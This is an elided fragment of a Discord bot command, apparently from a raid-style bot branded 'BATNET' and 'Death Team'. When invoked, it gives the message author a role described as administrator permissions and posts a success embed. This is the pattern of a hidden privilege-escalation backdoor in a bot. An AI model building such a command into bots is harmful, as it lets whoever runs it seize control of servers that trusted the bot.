...
async execute(client, message, args){
     setTimeout(function() {
          ...
          console.log(chalk.cyan(`\n[ BATNET ] ${message.author.tag} Has executed the admin command`));
          ...
          message.member.roles.add(role).then(function(role) {
          ...
          message.channel.send({
               embed: {
                    description: `${emojis.bat} **| Administrator permits given successful.**`,
                    author: {
                              name: 'Death Team',
                              url: 'https://discord.gg/DeathTeam',
                              icon_url: 'https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless'
